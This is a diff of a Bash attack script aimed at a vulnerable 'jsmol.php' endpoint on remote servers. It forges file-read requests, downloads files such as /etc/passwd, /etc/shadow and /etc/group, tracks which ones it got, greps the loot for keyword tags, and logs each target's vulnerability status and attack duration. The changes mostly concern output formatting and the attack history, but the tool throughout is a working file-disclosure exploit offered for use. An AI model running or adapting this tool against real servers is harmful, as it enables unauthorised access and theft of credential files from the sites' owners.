@@ -32,20 +32,14 @@ function checkFileSize {
 	else
 		echo 'KO'
 	fi
-
-	}
+}
 function getFile {
 	this_filename="$1"
 	this_payloadtype="$2" #txt, b64
 	this_dest_file="$3"
 	this_forged_request=$(forgeRequest "$this_filename" "$this_payloadtype" )
 	sendRequest "$this_forged_request" 
-	#this_check_result=$(checkResult)
-	#if [ $this_check_result = "OK" ];then
-		cat "$curl_output_filename" > "$this_dest_file"
-	#else
-		#echo -e "    |_[!] ERROR: Can't get file $this_filename!" >&2
-	#fi
+	cat "$curl_output_filename" > "$this_dest_file"
 	}
 function checkFile {
 	this_filename="$1"
@@ -76,13 +70,19 @@ function downloadFiles {
 		dl_filename=$(echo "$dl_file"|sed 's/\//_/g'|sed 's/\.\./parent/g')
 		dl_dest="$download_folder/$this_dl_sub_folder/$dl_filename"
 		pct_dl=$(($total_files_being_dl*100/$total_files_to_dl))
-		showTitle "[Progress:$c_submain$pct_dl$c_reset$c_main%][downloaded:$c_submain$total_files_downloaded/$total_files_to_dl$c_reset$c_main] $dl_file" "" "2" "noNL"
+		text_progression="[Progress:$c_submain $pct_dl%$c_reset$c_reset$c_main]"
+		text_downloaded="[Downloaded:$c_submain $total_files_downloaded/$total_files_to_dl$c_reset$c_reset$c_main]"
+		text_file="[File:$c_submain$dl_file$c_reset$c_main]"
+		showTitle "$text_progression$text_downloaded $text_file" "" "2" "NoNL" "XMODE"
 		getFile "$dl_file" "$functionnal_payload" "$dl_dest"
 		check_size=$(checkFileSize "$dl_dest")
 		
 		if [ "$check_size" != "OK" ];then
-			echo -e "$c_error$check_size$c_reset"
 			rm -f "$dl_dest"
+			echo -e "$c_error$check_size$c_reset"
+			sleep $delai_download
+		else
+			total_files_downloaded=$(( $total_files_downloaded+1 ))
 			if [ "$dl_file" = "/etc/passwd" ] || [ "$dl_file" = "/etc/passwd-" ];then
 				got_passwd='TRUE'
 			fi
@@ -92,9 +92,8 @@ function downloadFiles {
 			if [ "$dl_file" = "/etc/group" ] || [ "$dl_file" = "/etc/group-" ];then
 				got_group='TRUE'
 			fi
-		else
-			total_files_downloaded=$(( $total_files_downloaded+1 ))
 			echo -e "$c_text$check_size$c_reset"
+			sleep $delai_download
 		fi
 	done
 	}
@@ -106,54 +105,171 @@ function listDownloadedFiles {
 	filelist=$(ls -A "$download_folder/$this_dl_sub_folder/")
 	for fl in $(echo "$filelist");do
 		showTitle "$fl" "" "2" ""
-		showTitle "Filesize" "$filesize" "3" "NoNL"
-		echo ""$(stat -c%s "$download_folder/$this_dl_sub_folder/$fl")" octets"
+		filepath="$download_folder/$this_dl_sub_folder/$fl"
+		filesize=$(getFilesize "$filepath")
+		#showTitle "Filesize" "$c_warn$filesize$c_reset$c_text" "3" ""
+		showTitle "Filesize" "$filesize" "3" ""
 		showTitle "Tag search" "" "3" ""
-		for tg in ${tags_checklist[*]};do
-			check_tag=$(cat "$download_folder/$this_dl_sub_folder/$fl" | grep -n "$tg")
-			if [ ${#check_tag} -gt 0 ];then 
-				showTitle "$tg tag" "$c_main" "4" "noNL"
-				#echo -e ""$(echo -e "$check_tag$c_text"|sed "s/^/\\\n${arbo[5]}${chips[5]}\\$c_text/g"|sed "s/  /#@§/g")|sed "s/#@§/  /g"
-				echo -e ""$(echo -e "$check_tag$c_text"|sed "s/^/\\\n${arbo[5]}${chips[5]}line \\$c_text/g"|sed "s/  /#@§/g")|sed "s/#@§/  /g"
-			fi
-		done
+		
+		searchTagInFile "$filepath"
 	done
+	}
+function replaceCharsInTagInFile {
+	this_check_tag="$1"
+	this_check_tag=${this_check_tag//\$/}
+	this_check_tag=${this_check_tag//\*/x}
+	this_check_tag=${this_check_tag//./}
+	this_check_tag=${this_check_tag//\\\n/}
+	this_check_tag=${this_check_tag//\\\t/ }
+	this_check_tag=${this_check_tag//	/ }
+	this_check_tag=${this_check_tag// /µ£§}
+	echo "$this_check_tag"
+	}
+function searchTagInFile {
+	this_filename="$1"
+	for tg in ${tags_checklist[*]};do
+		check_tag=$(cat "$this_filename" | grep -n "$tg"|sed 's/[*]/x/g') #
+		if [ ${#check_tag} -gt 0 ];then 
+			tag_file="$this_filename.tag"
+			check_tag=$(replaceCharsInTagInFile "$check_tag")
+			echo "$check_tag" > "$tag_file"
+			showTitle "Tag $c_submain#$tg$c_reset$c_main" "" "4" ""
+			for tag_line in $( cat "$tag_file");do
+				tag_line=${tag_line//µ£§/ }
+				tag_line_number=$(echo "$tag_line"|cut -d ':' -f 1)
+				tag_line_data=$(echo "$tag_line"|cut -d ':' -f 2-|sed "s/^[ ]*//g"|sed "s/[ ]*$//g")
+				showTitle "Line n°$c_submain$tag_line_number$c_reset$c_main" "" "5" "NoNL"
+				tag_line_data=$(echo "$tag_line_data"|sed "s/\t/ /g"|sed "s/$tg/\\${c_warn}${tg}\\${c_reset}\\${c_text}/g")
+				echo -e "$c_text$tag_line_data$c_reset"
+			done
+			rm -f "$tag_file" 2>/dev/null 1>/dev/null
+		fi
+	done
+	}
+function getFilesize {
+	this_filename="$1"
+	this_filesize=$(stat -c%s "$this_filename")
+	if [ "$this_filesize" -gt 1024 ];then
+		this_filesize=$(( $this_filesize/1024 ))' Ko'
+	else
+		this_filesize=$this_filesize' octets'
+	fi
+	echo "$this_filesize"
 	}
 function checkFolders {
 	this_folder="$download_folder"
 	this_subfolder="$1"
-	if [ ! -d "$download_folder" ];then 
-		showTitle "Creating" "$download_folder" "2" "NoNL"
-		mkdir "$download_folder" 
-		echo -e "Done"$c_reset
-	else
-		showTitle "Folder $download_folder" "Already exists" "2"
+	folders_to_check=( "$this_folder" "$this_folder/$dl_sub_folder" )
+	
+	for a_folder in ${folders_to_check[*]};do
+		if [ ! -d "$a_folder" ];then 
+			showTitle "Creating $c_submain$a_folder$c_reset$c_main" "" "2" "NoNL"
+			mkdir "$a_folder" 
+			echo -e $c_warn"Done"$c_reset
+		else
+			showTitle "Folder $c_submain$a_folder$c_reset$c_main" "Already exists" "2"
+		fi
+	done
+	}
+function secondsToTime {
+	this_secondes="$1"
+    	this_mn=$(( $this_secondes/60 ))
+    	this_s=$(( $this_secondes%60 ))
+    	if [ $this_mn -lt 10 ];then
+		this_mn='0'$this_mn
 	fi
-	if [ ! -d "$download_folder/$dl_sub_folder" ];then 
-		showTitle "Creating" "$download_folder/$dl_sub_folder" "2" "NoNL"
-		mkdir "$download_folder/$dl_sub_folder" 
-		echo -e "Done"$c_reset
+    	if [ $this_s -lt 10 ];then
+		this_s='0'$this_s
+	fi
+	echo "$this_mn"':'"$this_s"''
+	}
+function binaryToHuman {
+	this_true_or_false="$1"
+	if [ "$this_true_or_false" = "TRUE" ];then
+		this_yes_or_no="${c_warn}Yes"
 	else
-		showTitle "Folder $download_folder/$dl_sub_folder" "Already exists" "2"
+		this_yes_or_no="${c_error}NO!"
+	fi
+	echo -e "$this_yes_or_no"
+	}
+function echox	{
+	if [ ${#2} -gt 0 ];then
+		tput cuu1;tput el;echo -en "$1"
+	else
+		tput cuu1;tput el;echo -e "$1"
 	fi
 	}
 function saveToHistory {
-	#URL;VULNERABLE;PASSWD;SHADOW;GROUP;DATE;DURATION
-	history_line="$jsmolphp_url;$is_vuln;$got_passwd;$got_shadow;$got_group;$attack_date_start;$attack_duration"
+	#URL;isVulnerable;PayloadType;gotPasswd;gotShadow;gotGroup;Date;Duration
+	history_line="$jsmolphp_url;$is_vuln;$functionnal_payload;$got_passwd;$got_shadow;$got_group;$attack_date_start;$attack_duration"
 	echo -e "$history_line" >> "$history_file" 
+	}
+function readFromHistory {
+	this_target_filter="$1"
+	#URL;isVulnerable;PayloadType;gotPasswd;gotShadow;gotGroup;Date;Duration
+	hist_search=$(cat "$history_file" | egrep "$this_target_filter" | tail -n 1)
+	echo "$hist_search"
+	}
+function historyData {
+	this_field="$1"
+	#URL;isVulnerable;PayloadType;gotPasswd;gotShadow;gotGroup;Date;Duration
+	# 1 ;     2      ;      3    ;    4    ;    5    ;    6   ;  7 ;  8   
+	case "$this_field" in
+	'vulnerable')
+	    	value_tmp=$(echo "$history_datas"|cut -d ';' -f 2)
+		value=$(binaryToHuman "$value_tmp")
+	    	;;
+	'payload')
+	    	value=$(echo "$history_datas"|cut -d ';' -f 3)
+	    	;;
+	'passwd')
+	    	value_tmp=$(echo "$history_datas"|cut -d ';' -f 4)
+		value=$(binaryToHuman "$value_tmp")
+	    	;;
+	'shadow')
+	    	value_tmp=$(echo "$history_datas"|cut -d ';' -f 5)
+		value=$(binaryToHuman "$value_tmp")
+	    	;;
+	'group')
+	    	value_tmp=$(echo "$history_datas"|cut -d ';' -f 6)
+		value=$(binaryToHuman "$value_tmp")
+	    	;;
+	'date')
+	    	value_tmp=$(echo "$history_datas"|cut -d ';' -f 7)
+		value=$(date -d @$value_tmp)
+	    	;;
+	'duration')
+		value_tmp=$(echo "$history_datas"|cut -d ';' -f 8)
+		value=$( secondsToTime "$value_tmp" )
+	    	;;
+	*)
+	    	value='ERROR'
+	    	;;
+	esac
+	echo -e "$value"
 	}
 function showTitle {
 	this_label="$1"
 	this_msg="$2"
 	this_lvl="$3"
 	this_nl="$4"
+	this_xmode="$5"
 	this_chip=${chips[$this_lvl]}
 	this_arbo=${arbo[$this_lvl]}
 
-	if [ ${#this_nl} -gt 0 ];then
-		echo -en "$c_main$this_arbo$this_chip $this_label:$c_text $this_msg"
+	if [ ${#this_xmode} -gt 0 ];then
+		
+		if [ ${#this_nl} -gt 0 ];then
+			echox "$c_main$this_arbo$this_chip $this_label:$c_text $this_msg$c_reset" "$this_nl"
+		else
+			echox "$c_main$this_arbo$this_chip $this_label:$c_text $this_msg$c_reset"
+		fi
 	else
-		echo -e  "$c_main$this_arbo$this_chip $this_label:$c_text $this_msg"
+		if [ ${#this_nl} -gt 0 ];then
+			echo -en "$c_main$this_arbo$this_chip $this_label:$c_text $this_msg$c_reset"
+		else
+			echo -e  "$c_main$this_arbo$this_chip $this_label:$c_text $this_msg$c_reset"
+		fi
 	fi
 	}
 function showBanner {
@@ -164,11 +280,12 @@ function showBanner {
 	l3=$(echo "$banner"|head -n 4 |tail -n 1)
 	l4=$(echo "$banner"|head -n 5 |tail -n 1)
 	lasts=$(echo "$banner"|tail -n +6 )
+	clear
 	echo -e "\033[0;31m$l1"
 	echo -e "\033[1;31m$l2"
 	echo -e "\033[0;33m$l3"
 	echo -e "\033[1;33m$l4"
 	echo -e "$c_main$lasts"
-	echo -e "$c_text         By CHORFA Alla-eddine -  h4ckr213dz@gmail.com$c_reset\n"
+	echo -e "$c_submain $script_version    By CHORFA Alla-eddine -  h4ckr213dz@gmail.com$c_reset\n"
 	}
 
